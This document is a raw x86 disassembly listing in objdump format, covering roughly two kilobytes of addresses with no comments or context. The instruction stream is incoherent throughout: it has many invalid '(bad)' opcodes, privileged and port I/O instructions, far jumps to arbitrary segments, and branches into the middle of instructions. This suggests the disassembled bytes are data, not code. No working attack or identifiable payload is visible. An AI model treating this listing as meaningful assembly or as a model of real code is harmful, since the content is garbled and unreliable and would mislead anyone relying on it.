  41533c:	push   eax
  41533d:	into   
  41533e:	cmp    esi,DWORD PTR [ecx+eax*4]
  415341:	shr    DWORD PTR [edx+0x71b8c4ed],cl
  415347:	aas    
  415348:	fwait
  415349:	loop   0x4152cb
  41534b:	(bad)  
  41534c:	fidiv  WORD PTR [eax+0x50]
  41534f:	and    eax,0x612ae34a
  415354:	dec    esp
  415355:	and    ah,BYTE PTR [ecx+0x3]
  415358:	loopne 0x4153a8
  41535a:	xchg   edi,eax
  41535b:	pop    ebx
  41535c:	rcr    DWORD PTR [edx+0x7b814478],1
  415362:	pushf  
  415363:	shl    BYTE PTR [esi-0x3eb57329],cl
  415369:	pop    ss
  41536a:	rcr    eax,1
  41536c:	pop    eax
  41536d:	pop    ebx
  41536f:	jb     0x4152fc
  415371:	push   ebp
  415372:	dec    esp
  415373:	xchg   esp,eax
  415374:	jge    0x41534e
  415376:	nop
  415377:	mov    bh,0x7d
  415379:	xor    eax,0xe4114fc1
  41537e:	mov    dh,0xf1
  415380:	sbb    al,0xaa
  415382:	loop   0x415369
  415384:	push   ebx
  415385:	xor    ebx,DWORD PTR [esp+ecx*4+0x3f]
  415389:	or     DWORD PTR [esi-0x216d5263],esp
  41538f:	jmp    0x41533f
  415391:	lds    eax,FWORD PTR [ebx]
  415393:	repz xchg edx,eax
  415395:	neg    BYTE PTR [edi-0x11a5c8ac]
  41539b:	mov    al,ds:0xa90f040b
  4153a0:	sbb    al,0x7e
  4153a2:	mov    bl,0xef
  4153a4:	dec    esi
  4153a5:	dec    edi
  4153a6:	jecxz  0x4153a7
  4153a8:	aas    
  4153a9:	push   ebx
  4153aa:	fcomp  DWORD PTR [ebx]
  4153ac:	nop
  4153ad:	inc    edx
  4153ae:	call   FWORD PTR [ebx]
  4153b0:	mov    edx,0x91ba096
  4153b5:	mov    ch,0x21
  4153b7:	pop    esp
  4153b8:	shr    BYTE PTR [eax],cl
  4153ba:	das    
  4153bb:	mov    ds:0x5de3b7b,eax
  4153c0:	pushf  
  4153c1:	stos   DWORD PTR es:[edi],eax
  4153c2:	jno    0x41536b
  4153c4:	sbb    esp,DWORD PTR [edx+edx*2+0xc]
  4153c8:	iret   
  4153c9:	inc    edi
  4153ca:	lea    esp,[edx-0x51]
  4153cd:	test   DWORD PTR [ecx],edi
  4153cf:	jo     0x4153ee
  4153d1:	pop    ebx
  4153d2:	idiv   DWORD PTR [edi-0x50]
  4153d5:	call   0x31dc:0xfa401727
  4153dc:	adc    DWORD PTR [ebx+0x45eadf45],edx
  4153e2:	hlt    
  4153e3:	sbb    ebx,DWORD PTR [eax]
  4153e5:	xchg   esi,eax
  4153e6:	mov    eax,0x6c566a9f
  4153eb:	add    edx,DWORD PTR [edx-0x732f9f73]
  4153f1:	cmp    eax,0xe0d9364
  4153f6:	je     0x4153f9
  4153f8:	xor    DWORD PTR [ebx+0x28b7554f],edx
  4153fe:	data16 sbb cl,ch
  415401:	ins    DWORD PTR es:[edi],dx
  415402:	imul   esp,edx,0xd5940728
  415408:	pop    esp
  415409:	dec    ebx
  41540a:	pop    ecx
  41540b:	inc    ecx
  41540c:	inc    ebp
  41540d:	(bad)  [ebp+0x2f9af45a]
  415413:	xor    eax,0x999d247f
  415418:	mov    edx,DWORD PTR [edx-0x44]
  41541b:	cmp    BYTE PTR [ebx+ecx*8],al
  41541e:	sbb    al,0xd0
  415420:	mov    DWORD PTR ds:0x154f8755,esp
  415426:	add    DWORD PTR [edx-0x5bc1be9e],edi
  41542c:	adc    al,0xe8
  41542e:	ret    
  41542f:	arpl   WORD PTR [ebp+edx*1+0x1e],cx
  415433:	sbb    al,BYTE PTR [eax+0x51aea0cb]
  415439:	ss mov esp,gs
  41543c:	mov    dh,0x6
  41543e:	fnstcw WORD PTR [ebx-0x632f6122]
  415444:	push   edx
  415445:	leave  
  415446:	data16 jnp 0x4153d9
  415449:	test   eax,0xaaf8e707
  41544e:	jns    0x4153f2
  415450:	push   ss
  415451:	or     eax,0xb286ebd6
  415456:	cmp    al,0x28
  415458:	push   ebx
  415459:	sub    bl,BYTE PTR [ecx+ecx*4-0x5e]
  41545d:	call   0xfdb179b8
  415462:	pop    eax
  415463:	test   DWORD PTR [edi],esi
  415465:	sub    ebp,DWORD PTR [eax+0x4d]
  415468:	mov    al,ds:0x6f1fd7c
  41546e:	sbb    bh,BYTE PTR [ebx+0x6]
  415471:	pop    esi
  415472:	add    edi,DWORD PTR [ecx]
  415474:	test   al,0x11
  415476:	call   0xfabdaf71
  41547b:	mov    ch,0x99
  41547d:	xor    BYTE PTR [ecx],cl
  41547f:	mov    ebp,DWORD PTR [eax+0x22dfbb97]
  415485:	sub    al,0x20
  415487:	mov    ebx,eax
  415489:	xor    DWORD PTR [ecx+edx*4-0x1f166611],0xa
  415491:	cli    
  415492:	test   bh,0x1e
  415495:	(bad)  
  415496:	int    0x4c
  415498:	(bad)  
  415499:	fsub   QWORD PTR [eax]
  41549b:	scas   al,BYTE PTR es:[edi]
  41549c:	ds jl  0x41546f
  41549f:	mov    ebp,0xc8d02d07
  4154a4:	int    0x35
  4154a6:	bound  ecx,QWORD PTR [ecx+0xa]
  4154a9:	cmp    eax,0x86f75ca0
  4154ae:	push   ecx
  4154af:	test   BYTE PTR ds:0x5e0dcda8,bl
  4154b5:	bound  esp,QWORD PTR ds:0x2beab45
  4154bb:	inc    edx
  4154bc:	xor    eax,0x33c47975
  4154c1:	and    DWORD PTR [esi-0x10],ebx
  4154c4:	cdq    
  4154c5:	or     al,0x41
  4154c7:	or     bh,ah
  4154c9:	js     0x4154c8
  4154cb:	enter  0x3fe9,0x68
  4154cf:	loope  0x415491
  4154d1:	clc    
  4154d2:	fucomp st(4)
  4154d4:	jmp    0x6d38:0x86985d98
  4154db:	cld    
  4154dc:	xor    al,0x7
  4154de:	mov    eax,ds:0x57354056
  4154e3:	cs adc al,0x6b
  4154e6:	repz mov al,0xe8
  4154e9:	push   esi
  4154ea:	xchg   edx,eax
  4154eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154ec:	cmp    edi,esp
  4154ee:	adc    eax,edi
  4154f0:	add    dl,BYTE PTR [esi+0x2a11d638]
  4154f6:	pop    es
  4154f7:	outs   dx,BYTE PTR ds:[esi]
  4154f8:	dec    ecx
  4154f9:	ins    BYTE PTR es:[edi],dx
  4154fa:	xlat   BYTE PTR ds:[ebx]
  4154fb:	mov    ah,0xae
  4154fd:	shl    BYTE PTR [edx],1
  4154ff:	nop
  415500:	jmp    0xd2fb4767
  415505:	daa    
  415506:	mov    bh,BYTE PTR [edx-0x1d]
  415509:	sub    DWORD PTR [ecx-0x3bd8a074],ebp
  41550f:	retf   
  415510:	shl    BYTE PTR [esi],0xa0
  415513:	adc    al,cl
  415515:	jge    0x415542
  415517:	(bad)  
  415518:	rcr    edx,1
  41551a:	rol    DWORD PTR [esi-0x4d],cl
  41551d:	cs aad 0xe7
  415520:	mov    ch,0xbb
  415522:	loopne 0x4154e6
  415524:	mov    WORD PTR [edi+edi*1+0x74b90da1],ss
  41552b:	gs pop ebp
  41552d:	cli    
  41552e:	mov    BYTE PTR [ecx-0x40],ah
  415531:	jmp    0x47f8851f
  415536:	into   
  415537:	mov    ch,0xa1
  415539:	sub    BYTE PTR [ebx],bl
  41553b:	dec    ebp
  41553c:	lods   al,BYTE PTR ds:[esi]
  41553d:	neg    edx
  41553f:	fisub  WORD PTR [ebx+ebp*1]
  415542:	outs   dx,BYTE PTR ds:[esi]
  415543:	iret   
  415544:	xchg   edx,eax
  415545:	add    edi,edx
  415547:	mov    ds:0xcfa70276,eax
  41554c:	(bad)  
  41554e:	mov    ecx,0x92084198
  415553:	ja     0x415534
  415555:	and    eax,0xd634d7c3
  41555a:	loope  0x4155cf
  41555c:	inc    ecx
  41555d:	jl     0x41554c
  41555f:	pusha  
  415560:	mov    ebp,0xa5f19cae
  415565:	jbe    0x415582
  415567:	pop    edi
  415568:	mov    esi,0x82b54985
  41556d:	clc    
  41556e:	jb     0x4154fb
  415570:	pop    ecx
  415571:	inc    eax
  415572:	fild   QWORD PTR [edx]
  415574:	out    dx,al
  415575:	sahf   
  415576:	scas   eax,DWORD PTR es:[edi]
  415577:	jecxz  0x41550c
  415579:	mov    bl,0x4b
  41557b:	lea    ebp,[edx+0x571cc1cb]
  415581:	test   eax,0xfbd46b0b
  415586:	stos   DWORD PTR es:[edi],eax
  415587:	popf   
  415588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415589:	out    dx,eax
  41558a:	pop    edx
  41558b:	push   cs
  41558c:	pop    esp
  41558d:	cdq    
  41558e:	xchg   ebp,eax
  41558f:	push   0xffa4a387
  415594:	mov    esi,0xdb823d3f
  415599:	loopne 0x415570
  41559b:	xchg   esi,eax
  41559c:	cwde   
  41559d:	jo     0x4155f4
  41559f:	js     0x4155ae
  4155a1:	pushf  
  4155a2:	mov    al,0xbc
  4155a4:	jecxz  0x415563
  4155a6:	xchg   edi,eax
  4155a7:	imul   ecx,DWORD PTR [eax+0x7d],0x3c
  4155ab:	into   
  4155ac:	xor    dl,bh
  4155ae:	in     al,dx
  4155af:	push   ebx
  4155b0:	imul   esp,DWORD PTR [edx+edi*4-0x3b0c7384],0xf0df74e7
  4155bb:	inc    ecx
  4155bc:	ins    BYTE PTR es:[edi],dx
  4155bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4155be:	add    DWORD PTR [eax-0x17],edi
  4155c1:	sbb    BYTE PTR [ebp-0xd],0x44
  4155c5:	xor    ebp,edi
  4155c7:	jmp    0x41555a
  4155c9:	add    al,BYTE PTR [edx]
  4155cb:	stc    
  4155cc:	pusha  
  4155cd:	sbb    ebx,DWORD PTR [ebp-0x3c276d]
  4155d3:	add    BYTE PTR [edi+ebp*8+0x67af96dc],dh
  4155da:	push   cs
  4155db:	mov    al,BYTE PTR [edi+0x5d]
  4155de:	xchg   edi,ebp
  4155e0:	loopne 0x41556f
  4155e2:	aad    0x43
  4155e4:	adc    al,dl
  4155e6:	or     bl,0xff
  4155e9:	mov    dh,0x99
  4155eb:	into   
  4155ec:	in     al,0xe5
  4155ee:	pop    eax
  4155ef:	mov    bl,0x38
  4155f1:	mov    DWORD PTR [ebx-0x7ea1fb13],ebp
  4155f7:	add    dl,cl
  4155f9:	sub    dl,BYTE PTR [esi-0x58cb8224]
  4155ff:	pop    ebx
  415600:	jle    0x4155bc
  415602:	fsub   st,st(5)
  415604:	adc    DWORD PTR [ebx-0x34],edi
  415607:	call   0x50d0e1e6
  41560c:	fild   DWORD PTR [esi+esi*1-0x55]
  415610:	sub    bl,bh
  415612:	xor    bh,BYTE PTR [ebx+0x5289cf7]
  415618:	jbe    0x415620
  41561a:	iret   
  41561b:	and    edx,edx
  41561d:	and    BYTE PTR [edx-0x1c84d124],dh
  415623:	pop    edi
  415624:	lahf   
  415625:	enter  0x98ee,0x95
  415629:	fistp  DWORD PTR [eax+0x6ef53fa5]
  41562f:	jns    0x41567a
  415631:	mov    esp,esp
  415633:	mov    eax,ds:0xdbf18bc8
  415638:	cs test dh,0xe5
  41563c:	and    bh,cl
  41563e:	lahf   
  41563f:	mov    ss,WORD PTR [esi+0x7b]
  415642:	xor    BYTE PTR [esi-0x40],ah
  415645:	inc    eax
  415646:	adc    ch,ch
  415648:	daa    
  415649:	imul   esp,DWORD PTR ds:0x51dd6d79,0x1d736721
  415653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415654:	push   DWORD PTR [esi-0x7c]
  415657:	lds    edi,FWORD PTR [esi-0x3aa39ead]
  41565d:	fisttp QWORD PTR [ebx-0x21eb79bc]
  415663:	xlat   BYTE PTR ds:[ebx]
  415664:	jp     0x415667
  415666:	(bad)  
  415667:	int3   
  415668:	cmp    cl,0x77
  41566b:	mov    edi,0x889ff15b
  415670:	mov    eax,ds:0x5464515d
  415675:	aad    0xb3
  415677:	add    eax,0x1655f26d
  41567c:	pop    edi
  41567d:	in     eax,dx
  41567e:	std    
  41567f:	leave  
  415680:	adc    ebx,edi
  415682:	mov    esi,0xcb107fcd
  415687:	pop    ebp
  415688:	lahf   
  415689:	adc    bl,bl
  41568b:	ja     0x415665
  41568d:	jge    0x4156e9
  41568f:	bound  esp,QWORD PTR [edx-0x4ec4dad3]
  415695:	icebp  
  415696:	sbb    eax,DWORD PTR [edi]
  415698:	aas    
  415699:	cmc    
  41569a:	ret    0xda83
  41569d:	sub    dh,BYTE PTR [ebx]
  41569f:	retf   0xa119
  4156a2:	inc    esi
  4156a3:	mov    dl,BYTE PTR [eax+0xc]
  4156a6:	cmp    bl,0x38
  4156a9:	icebp  
  4156aa:	nop
  4156ab:	adc    al,0x89
  4156ad:	jbe    0x41569a
  4156af:	xchg   esi,eax
  4156b0:	push   ecx
  4156b1:	adc    DWORD PTR [eax],0xfffffff6
  4156b4:	jo     0x4156ec
  4156b6:	mov    WORD PTR [ebx+0x4a6104ed],fs
  4156bc:	cld    
  4156bd:	loop   0x415692
  4156bf:	fistp  WORD PTR [ecx-0x1c]
  4156c2:	sti    
  4156c3:	iret   
  4156c4:	pop    esp
  4156c5:	sub    bl,BYTE PTR [ebp-0x66]
  4156c8:	jmp    DWORD PTR [ecx+0x15]
  4156cb:	test   BYTE PTR [eax+0x4fef63de],0x91
  4156d2:	jnp    0x4156b2
  4156d4:	jl     0x4156f5
  4156d6:	sub    bh,BYTE PTR [ecx-0x46]
  4156d9:	cmp    DWORD PTR [eax+0x63719ec2],ebp
  4156df:	fiadd  WORD PTR [edx]
  4156e1:	sub    bh,BYTE PTR [ecx+0x69b352eb]
  4156e7:	jmp    0x7e28:0xbdc122de
  4156ee:	test   eax,0xfa906019
  4156f3:	mov    ds:0x4198eb74,al
  4156f8:	mov    WORD PTR [edi+0xb632852],?
  4156fe:	dec    ecx
  4156ff:	mov    dl,ch
  415701:	jnp    0x41574c
  415703:	pop    edx
  415704:	ins    DWORD PTR es:[edi],dx
  415705:	push   0xee221319
  41570a:	pop    ebx
  41570b:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41570d:	jl     0x41571e
  41570f:	addr16 jg 0x415765
  415712:	dec    ebx
  415713:	xchg   esi,eax
  415714:	cmp    ch,BYTE PTR [ebp+0x41082054]
  41571a:	popf   
  41571b:	push   ebx
  41571c:	fild   WORD PTR [ecx+0x4eb58ff]
  415722:	push   eax
  415723:	stos   DWORD PTR es:[edi],eax
  415724:	sbb    BYTE PTR [esp+edx*2+0xf7aebcc],dh
  41572b:	push   esp
  41572c:	retf   
  41572d:	out    0x97,al
  41572f:	adc    cl,BYTE PTR [ebx+0xabe4eb8]
  415735:	loopne 0x4156cb
  415737:	loopne 0x415772
  415739:	mov    DWORD PTR [ecx+0x44],ebp
  41573c:	daa    
  41573d:	push   eax
  41573e:	adc    dh,ch
  415740:	push   es
  415741:	mov    DWORD PTR [eax+0x5e],0x47c6b581
  415748:	push   edx
  415749:	or     esp,DWORD PTR [eax+ecx*2+0x60]
  41574d:	jmp    0x73b5:0x99b76f37
  415754:	jecxz  0x4157a4
  415756:	mov    edi,0x61ad471c
  41575b:	imul   esi,DWORD PTR [edi],0xffffff9c
  41575e:	(bad)  
  41575f:	cli    
  415760:	push   ebp
  415761:	aam    0x23
  415763:	popa   
  415764:	cmp    ebx,0x9a479477
  41576a:	aaa    
  41576b:	stos   BYTE PTR es:[edi],al
  41576c:	push   edx
  41576d:	pop    ebp
  41576e:	fidiv  WORD PTR [edx+0x1f795da]
  415774:	call   0x9efbf689
  415779:	mov    edx,0x9f9122c9
  41577e:	inc    ebx
  41577f:	popa   
  415780:	cmp    DWORD PTR [esi],esi
  415782:	or     al,0x8b
  415784:	shr    bh,0x2d
  415787:	jmp    0x415766
  415789:	jge    0x415796
  41578b:	fist   DWORD PTR [edx+0x5561372f]
  415791:	outs   dx,DWORD PTR ds:[esi]
  415792:	xchg   esi,eax
  415793:	mov    bl,0x73
  415795:	test   eax,0xebdf7af3
  41579a:	pop    edx
  41579b:	call   0x50da:0xa460c6a2
  4157a2:	and    BYTE PTR [edx],bh
  4157a4:	sbb    DWORD PTR [esi+0x6d],0x6dede208
  4157ab:	retf   
  4157ac:	sub    bh,BYTE PTR [edi-0x3ce00e7]
  4157b2:	scas   al,BYTE PTR es:[edi]
  4157b3:	or     ecx,edi
  4157b5:	scas   al,BYTE PTR es:[edi]
  4157b6:	mov    esi,0xab8f098e
  4157bb:	cmp    BYTE PTR ds:0x1c9ef023,bh
  4157c1:	inc    edx
  4157c2:	repz mov cl,0x3a
  4157c5:	jmp    0xdf97a935
  4157ca:	dec    ebp
  4157cb:	int    0x66
  4157cd:	jno    0x415824
  4157cf:	ret    
  4157d0:	loope  0x4157a6
  4157d2:	mov    ecx,0x78978c07
  4157d7:	dec    edi
  4157d8:	inc    ebp
  4157d9:	cmp    DWORD PTR [edx-0x75603674],edi
  4157df:	outs   dx,BYTE PTR ds:[esi]
  4157e0:	push   0x18
  4157e2:	and    ebx,DWORD PTR [esi-0x66]
  4157e5:	pop    ss
  4157e6:	out    0x2d,al
  4157e8:	adc    eax,0x12ae1803
  4157ed:	sbb    eax,0x385de196
  4157f2:	rcr    BYTE PTR [esi-0x49],cl
  4157f5:	pop    ds
  4157f6:	aad    0x5c
  4157f8:	stos   BYTE PTR es:[edi],al
  4157f9:	mov    ds:0x398161cb,eax
  4157fe:	or     ebp,DWORD PTR [esi-0x64]
  415801:	ret    
  415802:	push   ss
  415803:	ficom  WORD PTR [edi]
  415805:	popf   
  415806:	cmp    DWORD PTR [esi+0x35f9cb1e],ecx
  41580c:	std    
  41580d:	adc    BYTE PTR [edi],al
  41580f:	stos   DWORD PTR es:[edi],eax
  415810:	push   ecx
  415811:	ret    0x1caa
  415814:	hlt    
  415815:	jl     0x415839
  415817:	mov    ?,WORD PTR [ecx-0x4160abd2]
  41581d:	jnp    0x41588f
  41581f:	inc    eax
  415820:	aam    0x89
  415822:	sub    eax,0x724b645f
  415827:	(bad)  
  415828:	jno    0x4158a1
  41582a:	adc    BYTE PTR [ecx+0x2],dh
  41582d:	enter  0x3358,0x31
  415831:	mov    ch,0xe2
  415833:	aad    0x34
  415835:	sbb    BYTE PTR [ebx+0x6e],dh
  415838:	rol    BYTE PTR [ebp+0x4e583937],0x3e
  41583f:	mov    ebp,0x8ea12edc
  415844:	and    BYTE PTR [eax+0x44914830],dh
  41584a:	xlat   BYTE PTR ds:[ebx]
  41584b:	add    edi,DWORD PTR [ebx+0x7c1317a7]
  415851:	xor    eax,0x336940de
  415856:	aaa    
  415857:	jl     0x415836
  415859:	fadd   QWORD PTR ds:[esi-0x5f1cfb2d]
  415860:	das    
  415861:	test   eax,0xa3d8e1f4
  415866:	push   ebx
  415867:	cmp    eax,DWORD PTR [edx-0x46]
  41586a:	sbb    bl,BYTE PTR [ecx-0x9]
  41586d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41586e:	mov    ecx,0x5de9be1e
  415873:	xchg   ebx,eax
  415874:	out    0x76,eax
  415876:	mov    ss,WORD PTR [edi-0x51ed339b]
  41587c:	mov    ecx,DWORD PTR [ebx+0x4a0949db]
  415882:	mov    bh,al
  415884:	add    eax,DWORD PTR [ebp-0x3c0402e]
  41588a:	dec    esi
  41588b:	ror    DWORD PTR [ebx+0xd],0xf3
  41588f:	(bad)  
  415890:	jp     0x415863
  415892:	or     dl,BYTE PTR [edi+0x20]
  415895:	fmul   st(2),st
  415897:	aam    0x60
  415899:	enter  0xbcb3,0x28
  41589d:	inc    ecx
  41589e:	lods   al,BYTE PTR ds:[esi]
  41589f:	xor    eax,0xfd05e604
  4158a4:	ror    ebp,1
  4158a6:	inc    edi
  4158a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158a8:	das    
  4158a9:	(bad)  
  4158aa:	aad    0xc5
  4158ac:	xor    al,0xc9
  4158ae:	imul   ebp,DWORD PTR [edi+0x3],0x38
  4158b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158b3:	out    dx,eax
  4158b4:	into   
  4158b5:	clc    
  4158b6:	or     eax,DWORD PTR [ebp-0x21ba5b3f]
  4158bc:	jmp    0xe2fa:0x52fb086e
  4158c3:	leave  
  4158c4:	in     al,dx
  4158c5:	stos   DWORD PTR es:[edi],eax
  4158c6:	dec    esi
  4158c7:	in     eax,dx
  4158c8:	rcl    dl,cl
  4158ca:	dec    eax
  4158cb:	or     esi,DWORD PTR [eax-0x1d7361a0]
  4158d1:	inc    edx
  4158d2:	ins    BYTE PTR es:[edi],dx
  4158d3:	hlt    
  4158d4:	aaa    
  4158d5:	enter  0xa8be,0x43
  4158d9:	pop    ebp
  4158da:	ins    BYTE PTR es:[edi],dx
  4158db:	jmp    0x10a21c0e
  4158e0:	iret   
  4158e1:	pop    edx
  4158e2:	loope  0x4158c4
  4158e4:	push   ecx
  4158e5:	fcom   QWORD PTR [eax+0x60df762c]
  4158eb:	pusha  
  4158ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158ed:	add    BYTE PTR [edi+0x38],bl
  4158f0:	fwait
  4158f1:	std    
  4158f2:	sbb    al,dl
  4158f4:	mov    cl,0xe1
  4158f6:	push   ebx
  4158f7:	clc    
  4158f8:	mov    DWORD PTR [ebx+0x6c],esi
  4158fb:	push   cs
  4158fc:	xchg   ebx,eax
  4158fd:	test   al,0xf
  4158ff:	std    
  415900:	mov    eax,ds:0xd6bb6487
  415905:	into   
  415906:	lahf   
  415907:	(bad)  
  415908:	jbe    0x41597a
  41590a:	sti    
  41590b:	mov    dh,0x4b
  41590d:	push   ds
  41590e:	and    esi,0x755cbcc2
  415914:	sub    dl,dl
  415916:	sbb    bh,ah
  415918:	or     DWORD PTR [edx+esi*4+0x361c272d],edi
  41591f:	cwde   
  415920:	pop    esp
  415921:	js     0x415989
  415923:	jge    0x4158e1
  415925:	and    eax,0x4b618cad
  41592a:	loop   0x415948
  41592c:	mov    ds:0x3f715027,eax
  415931:	jb     0x41599d
  415933:	inc    esp
  415934:	pop    ds
  415935:	push   cs
  415936:	push   ss
  415937:	push   ss
  415938:	sbb    ch,cl
  41593a:	push   0xb82140ea
  41593f:	and    ah,BYTE PTR [esi-0x68ef44e9]
  415945:	ins    DWORD PTR es:[edi],dx
  415946:	and    BYTE PTR ds:0x51cb158,0xd1
  41594d:	xchg   esi,eax
  41594e:	fldenv [eax]
  415950:	in     al,dx
  415951:	popa   
  415952:	loop   0x415959
  415954:	jnp    0x415926
  415956:	call   0xb63b3a09
  41595b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41595c:	frstor [edi-0x35]
  41595f:	mov    al,ds:0xad1cc6c7
  415964:	out    dx,eax
  415965:	cmp    ebp,DWORD PTR [eax]
  415967:	sbb    al,0x44
  415969:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41596a:	fs mov eax,0xe9a1b6e4
  415970:	pmullw mm6,mm7
  415973:	pop    esp
  415974:	clc    
  415975:	xchg   esi,eax
  415976:	cmp    dl,cl
  415978:	stos   DWORD PTR es:[edi],eax
  415979:	push   cs
  41597a:	mov    ecx,0x828902fe
  41597f:	dec    esp
  415980:	fisttp QWORD PTR [edx]
  415982:	jg     0x4159f1
  415984:	xchg   ebp,eax
  415985:	nop
  415986:	fld    TBYTE PTR [ebp-0x75]
  415989:	lock fsubr QWORD PTR [eax-0x7d]
  41598d:	outs   dx,DWORD PTR ds:[esi]
  41598e:	and    DWORD PTR [ebp+0x7a77bfa9],ecx
  415994:	cli    
  415995:	ret    0x3f3d
  415998:	sub    BYTE PTR [edi],0xae
  41599b:	xchg   ebp,eax
  41599c:	arpl   WORD PTR [ecx],si
  41599e:	and    ah,dh
  4159a0:	retf   
  4159a1:	xchg   ecx,eax
  4159a2:	push   edx
  4159a3:	fwait
  4159a4:	mov    eax,DWORD PTR [edi-0x5d]
  4159a7:	loop   0x415968
  4159a9:	mov    WORD PTR [ecx-0x15abea16],ss
  4159af:	cdq    
  4159b0:	gs jbe 0x41597a
  4159b3:	xchg   esp,eax
  4159b4:	(bad)  
  4159b5:	arpl   WORD PTR [esi],bp
  4159b7:	in     al,dx
  4159b8:	mov    esi,0x3f24c141
  4159bd:	and    cl,BYTE PTR ds:0x93e84cf9
  4159c3:	popf   
  4159c4:	push   DWORD PTR [ecx+0x1ec17685]
  4159ca:	xor    esi,DWORD PTR [ebp+0x5c99daf7]
  4159d0:	lods   al,BYTE PTR ds:[esi]
  4159d1:	xor    esp,DWORD PTR [ebx-0x1c]
  4159d4:	popa   
  4159d5:	push   eax
  4159d6:	sahf   
  4159d7:	mov    dh,0xab
  4159d9:	jae    0x415a1d
  4159db:	fwait
  4159dc:	sbb    al,BYTE PTR [eax-0x5d]
  4159df:	loopne 0x415980
  4159e1:	jl     0x415a2c
  4159e3:	cmp    BYTE PTR [ebp+0xa6d9793],0x8c
  4159ea:	dec    eax
  4159eb:	retf   0x24eb
  4159ee:	pop    eax
  4159ef:	je     0x4159bd
  4159f1:	push   esi
  4159f2:	cmp    esp,esi
  4159f4:	test   BYTE PTR [ecx-0x7fdd52e4],bl
  4159fa:	test   al,0x36
  4159fc:	call   0x97104bde
  415a01:	lea    ebx,[ebx-0x5413ecb2]
  415a07:	fild   WORD PTR [eax+0x6c]
  415a0a:	jne    0x41598c
  415a0c:	or     ebp,edx
  415a0e:	int    0x9e
  415a10:	loop   0x4159cb
  415a12:	(bad)  
  415a13:	ss push esi
  415a15:	cmp    al,dh
  415a17:	out    0x36,eax
  415a19:	retf   0x9db0
  415a1c:	sub    esp,DWORD PTR [ebx]
  415a1e:	mov    ebp,0x660356ce
  415a23:	jp     0x415aa4
  415a25:	in     eax,dx
  415a26:	(bad)  
  415a27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a28:	sbb    eax,0x73802edd
  415a2d:	or     BYTE PTR [edx+0x45326ef0],0x9a
  415a34:	add    esp,DWORD PTR [ebx+0x50]
  415a37:	mov    ds:0xa3805eaa,eax
  415a3c:	out    dx,al
  415a3d:	out    0xbf,al
  415a3f:	out    dx,al
  415a40:	mov    esi,0xe68e0106
  415a45:	sub    ebp,DWORD PTR ds:0x5e96fcc1
  415a4b:	retf   
  415a4c:	xlat   BYTE PTR ds:[ebx]
  415a4d:	les    edi,FWORD PTR [esi]
  415a4f:	adc    al,0x3
  415a51:	xor    ah,BYTE PTR [eax]
  415a53:	mov    ds:0xda637345,eax
  415a58:	cmp    eax,0xb7435e23
  415a5d:	sti    
  415a5e:	out    0xbd,eax
  415a60:	aas    
  415a61:	add    DWORD PTR [ecx+esi*2],esi
  415a64:	and    dl,BYTE PTR [edx+esi*1+0x2c87d3c7]
  415a6b:	pushf  
  415a6c:	mov    dl,0x6b
  415a6e:	repz inc esi
  415a70:	cmc    
  415a71:	stos   BYTE PTR es:[edi],al
  415a72:	loope  0x415aaf
  415a74:	lea    ebp,ds:[esi]
  415a77:	push   edx
  415a78:	shl    DWORD PTR [edx-0x4c],cl
  415a7b:	jnp    0x415ade
  415a7d:	adc    edx,DWORD PTR [ebx+0x3ffb356d]
  415a83:	pusha  
  415a84:	mov    eax,0x6c41be8f
  415a89:	cld    
  415a8a:	pop    esp
  415a8b:	dec    ebp
  415a8c:	repz stc 
  415a8e:	adc    BYTE PTR [ebx],dh
  415a90:	cs (bad) 
  415a92:	mov    ecx,0xcf8a7b3b
  415a97:	pusha  
  415a98:	sar    DWORD PTR [esi-0x1a0d5a20],cl
  415a9e:	mov    ecx,0xf582b72b
  415aa3:	dec    edi
  415aa4:	sti    
  415aa5:	xchg   ecx,eax
  415aa6:	add    eax,DWORD PTR [ecx-0x77]
  415aa9:	cmp    al,0x79
  415aab:	mov    cl,0xf0
  415aad:	jns    0x415af1
  415aaf:	mov    eax,esp
  415ab1:	sub    al,0xa2
  415ab3:	push   edx
  415ab4:	(bad)  
  415ab5:	test   BYTE PTR [ecx+esi*1],0x67
  415ab9:	lds    edx,FWORD PTR [eax+0x4a]
  415abc:	ins    BYTE PTR es:[edi],dx
  415abd:	cli    
  415abe:	xor    esp,DWORD PTR [esi+0x61d8183d]
  415ac4:	(bad)  
  415ac5:	jns    0x415af2
  415ac7:	in     eax,0xda
  415ac9:	in     eax,dx
  415aca:	daa    
  415acb:	daa    
  415acc:	imul   edi,DWORD PTR [edx],0x34
  415acf:	add    eax,0x7318ef0d
  415ad4:	fild   QWORD PTR [edi-0x2339842f]
  415ada:	loope  0x415a6a
  415adc:	pushf  
  415add:	jnp    0x415a62
  415adf:	push   edx
  415ae0:	add    DWORD PTR [edx],esp
  415ae2:	das    
  415ae3:	lea    ecx,[ebp-0x36]
  415ae6:	(bad)  
  415ae7:	cmp    BYTE PTR [edi-0x3d],ah
  415aea:	xchg   esp,eax
  415aeb:	mov    ds:0xd1b45ef,al
  415af0:	jmp    0x415ac2
  415af2:	add    BYTE PTR [edi],ch
  415af4:	fwait
  415af5:	lods   eax,DWORD PTR ds:[si]
  415af7:	push   es
  415af8:	pop    ecx
  415af9:	inc    esi
  415afa:	or     al,0x27
  415afc:	or     dh,ch
  415afe:	adc    dh,BYTE PTR [esi]
  415b00:	aas    
  415b01:	dec    ebx
  415b02:	aad    0x19
  415b04:	mov    eax,0x4a0b09b0
  415b09:	jne    0x415b02
  415b0b:	sub    al,0xe6
  415b0d:	test   BYTE PTR gs:[edi],ch
  415b10:	(bad)  
  415b11:	mov    BYTE PTR [ebp-0x43],bh
  415b14:	aas    
  415b15:	inc    edx
  415b16:	or     dl,al
  415b18:	jmp    0x8b88:0xb68a27ec
  415b1f:	loopne 0x415afb
  415b21:	cli    
  415b22:	push   ds
  415b23:	inc    esp
  415b24:	ins    BYTE PTR es:[edi],dx
  415b25:	xchg   edx,eax
